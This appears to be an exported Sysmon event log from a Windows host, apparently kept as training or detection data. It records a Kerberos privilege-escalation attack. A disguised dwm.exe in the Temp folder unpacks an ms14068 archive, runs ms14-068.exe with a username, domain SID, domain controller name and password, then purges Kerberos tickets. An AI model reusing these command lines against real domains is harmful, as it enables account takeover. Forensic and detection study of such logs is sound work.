情報,2019/11/07 15:27:32,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:32.875
ProcessGuid: {CC41BF7E-5254-5A01-0000-0010C61C2200}
ProcessId: 6100
Image: C:\Windows\System32\klist.exe"
情報,2019/11/07 15:27:32,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:32.870
ProcessGuid: {CC41BF7E-5254-5A01-0000-0010C61C2200}
ProcessId: 6100
Image: C:\Windows\System32\klist.exe
CommandLine: klist  purge
CurrentDirectory: C:\Users\maebashi.gunma\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=0212B9B929CD5224B181081EEFAEAC5BE04038C4
ParentProcessGuid: {CC41BF7E-4E61-5A01-0000-0010F1A41400}
ParentProcessId: 1492
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" "
情報,2019/11/07 15:27:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:28.702
ProcessGuid: {CC41BF7E-5250-5A01-0000-0010BA182200}
ProcessId: 5176
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:27:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:28.687
ProcessGuid: {CC41BF7E-5250-5A01-0000-001049182200}
ProcessId: 5984
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:27:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:28.651
ProcessGuid: {CC41BF7E-5250-5A01-0000-0010BA182200}
ProcessId: 5176
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5250-5A01-0000-001049182200}
ParentProcessId: 5984
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""klist purge"""
情報,2019/11/07 15:27:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:28.645
ProcessGuid: {CC41BF7E-5250-5A01-0000-001049182200}
ProcessId: 5984
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""klist purge""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:27:16,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:27:16.076
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\ProgramData\USOPrivate\UpdateStore\updatestoretemp51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml
CreationUtcTime: 2019-12-14 17:33:55.212
PreviousCreationUtcTime: 2019-11-07 06:27:16.045"
情報,2019/11/07 15:27:11,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:11.639
ProcessGuid: {CC41BF7E-523F-5A01-0000-0010EE0E2200}
ProcessId: 5740
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:27:11,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:11.639
ProcessGuid: {CC41BF7E-523F-5A01-0000-00106F0E2200}
ProcessId: 3096
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:27:11,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:11.587
ProcessGuid: {CC41BF7E-523F-5A01-0000-0010EE0E2200}
ProcessId: 5740
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-523F-5A01-0000-00106F0E2200}
ParentProcessId: 3096
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""klist purge"""
情報,2019/11/07 15:27:11,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:11.575
ProcessGuid: {CC41BF7E-523F-5A01-0000-00106F0E2200}
ProcessId: 3096
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""klist purge""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:27:05,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:27:05.966
ProcessGuid: {CC41BF7E-5239-5A01-0000-0010CE022200}
ProcessId: 876
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:27:05,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:27:05.915
ProcessGuid: {CC41BF7E-5239-5A01-0000-0010CE022200}
ProcessId: 876
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:26:50,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:50.981
ProcessGuid: {CC41BF7E-522A-5A01-0000-00101FF42100}
ProcessId: 2024
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:26:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:50.913
ProcessGuid: {CC41BF7E-522A-5A01-0000-00101FF42100}
ProcessId: 2024
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:26:43,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:43.996
ProcessGuid: {CC41BF7E-521E-5A01-0000-0010D8E92100}
ProcessId: 1948
Image: C:\Windows\System32\dllhost.exe"
情報,2019/11/07 15:26:38,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:38.982
ProcessGuid: {CC41BF7E-521E-5A01-0000-0010D8E92100}
ProcessId: 1948
Image: C:\Windows\System32\dllhost.exe
CommandLine: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=0E33FA9CE0074155F361DB9CB36183431C8FC266
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:37.985
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107CDF2100}
ProcessId: 572
Image: C:\Windows\System32\SearchFilterHost.exe
CommandLine: ""C:\Windows\system32\SearchFilterHost.exe"" 0 628 632 640 8192 636 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: Medium
Hashes: SHA1=EB23AC4D23CB9BD84A7D76B091B95785EBE92540
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:37.953
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107CDD2100}
ProcessId: 6020
Image: C:\Windows\System32\SearchProtocolHost.exe
CommandLine: ""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DE8ADB411330C39BC9E67C1D8E753206E91E31DF
ParentProcessGuid: {CC41BF7E-4CF6-5A01-0000-0010ABA70300}
ParentProcessId: 2736
ParentImage: C:\Windows\System32\SearchIndexer.exe
ParentCommandLine: C:\Windows\system32\SearchIndexer.exe /Embedding"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:37.933
ProcessGuid: {CC41BF7E-521D-5A01-0000-001074D62100}
ProcessId: 5792
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:37.933
ProcessGuid: {CC41BF7E-521D-5A01-0000-001003D62100}
ProcessId: 456
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:37.933
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107BD82100}
ProcessId: 5140
Image: C:\Intel\Logs\ms14068\ms14-068.exe"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:26:37.761
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:26:37.761
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:37.650
ProcessGuid: {CC41BF7E-521D-5A01-0000-00107BD82100}
ProcessId: 5140
Image: C:\Intel\Logs\ms14068\ms14-068.exe
CommandLine: C:\Intel\Logs\ms14068\ms14-068.exe  -u maebashi.gunma@example.co.jp -s S-1-5-21-1524084746-3249201829-3114449661-1127 -d win-wfbhibe5gxz -p p@ssw0rd
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2E39B58C12C63C02BE9894E73C582BF865394ABB
ParentProcessGuid: {CC41BF7E-521D-5A01-0000-001003D62100}
ParentProcessId: 456
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\ms14068\ms14-068.exe -u maebashi.gunma@example.co.jp -s S-1-5-21-1524084746-3249201829-3114449661-1127 -d win-wfbhibe5gxz -p p@ssw0rd"""
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:37.554
ProcessGuid: {CC41BF7E-521D-5A01-0000-001074D62100}
ProcessId: 5792
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-521D-5A01-0000-001003D62100}
ParentProcessId: 456
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\ms14068\ms14-068.exe -u maebashi.gunma@example.co.jp -s S-1-5-21-1524084746-3249201829-3114449661-1127 -d win-wfbhibe5gxz -p p@ssw0rd"""
情報,2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:37.548
ProcessGuid: {CC41BF7E-521D-5A01-0000-001003D62100}
ProcessId: 456
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\ms14068\ms14-068.exe -u maebashi.gunma@example.co.jp -s S-1-5-21-1524084746-3249201829-3114449661-1127 -d win-wfbhibe5gxz -p p@ssw0rd""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:26:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:30.272
ProcessGuid: {CC41BF7E-520B-5A01-0000-0010D89F2100}
ProcessId: 5952
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:26:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:30.257
ProcessGuid: {CC41BF7E-520B-5A01-0000-001050AA2100}
ProcessId: 5908
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:26:19,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:19.297
ProcessGuid: {CC41BF7E-520B-5A01-0000-001050AA2100}
ProcessId: 5908
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5952 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-520B-5A01-0000-0010D89F2100}
ParentProcessId: 5952
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:26:19,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:19.123
ProcessGuid: {CC41BF7E-520B-5A01-0000-0010D89F2100}
ProcessId: 5952
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:26:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:26:16.274
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:26:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:16.055
ProcessGuid: {CC41BF7E-5208-5A01-0000-00108E902100}
ProcessId: 5436
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:26:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:16.028
ProcessGuid: {CC41BF7E-5208-5A01-0000-00108E902100}
ProcessId: 5436
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 89C2D2FB-FB59-3292-6389-4C8508FB0438 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:26:08,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:08.046
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010E57B2100}
ProcessId: 4820
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:26:08,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:08.046
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010747B2100}
ProcessId: 4324
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:26:08,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:08.046
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010E37D2100}
ProcessId: 5916
Image: C:\Intel\Logs\rar.exe"
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:26:07.796
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010B8832100}
ProcessId: 88
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:07.772
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010B8832100}
ProcessId: 88
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 9EAA5FFA-B40E-AD7C-7BBA-1FCF4B6E9D7D 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:26:07.483
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:26:07.483
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:07.477
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010E37D2100}
ProcessId: 5916
Image: C:\Intel\Logs\rar.exe
CommandLine: C:\Intel\Logs\rar.exe  x C:\Intel\Logs\ms14068.rar C:\Intel\Logs\
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=02258D0D381D54565948B0FB921CAE11CDCCC256
ParentProcessGuid: {CC41BF7E-51FF-5A01-0000-0010747B2100}
ParentProcessId: 4324
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\rar.exe x C:\Intel\Logs\ms14068.rar C:\Intel\Logs\"""
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:07.432
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010E57B2100}
ProcessId: 4820
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-51FF-5A01-0000-0010747B2100}
ParentProcessId: 4324
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\rar.exe x C:\Intel\Logs\ms14068.rar C:\Intel\Logs\"""
情報,2019/11/07 15:26:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:26:07.426
ProcessGuid: {CC41BF7E-51FF-5A01-0000-0010747B2100}
ProcessId: 4324
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\rar.exe x C:\Intel\Logs\ms14068.rar C:\Intel\Logs\""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:25:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:59.131
ProcessGuid: {CC41BF7E-51E9-5A01-0000-0010B0302100}
ProcessId: 3760
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:25:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:59.115
ProcessGuid: {CC41BF7E-51E9-5A01-0000-0010EA3B2100}
ProcessId: 620
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:25:48,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:25:48.151
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:25:46,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:25:46.305
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:25:45.977
ProcessGuid: {CC41BF7E-51E9-5A01-0000-001030482100}
ProcessId: 268
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:25:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:25:45.928
ProcessGuid: {CC41BF7E-51E9-5A01-0000-001030482100}
ProcessId: 268
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 253DAEF1-B567-3316-CB4F-83A991D59C1C 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
